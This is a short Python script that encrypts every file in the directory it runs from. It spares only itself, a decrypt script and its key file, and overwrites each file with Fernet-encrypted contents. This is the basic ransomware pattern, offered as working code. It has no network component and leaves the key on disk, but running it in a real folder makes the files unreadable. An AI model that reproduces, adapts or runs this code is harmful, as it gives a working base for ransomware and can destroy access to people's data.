import os
from cryptography.fernet import Fernet

# Get a list of files to encrypt
files = []
for file in os.listdir():
    if os.path.isfile(file) and file not in ["encrypt.py", "decrypt.py", "thekey.key"]:
        files.append(file)

# Generate an encryption key
key = Fernet.generate_key()

# Save the key to a file
with open("thekey.key", "wb") as key_file:
    key_file.write(key)

# Encrypt files
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)

print("Encryption complete!")
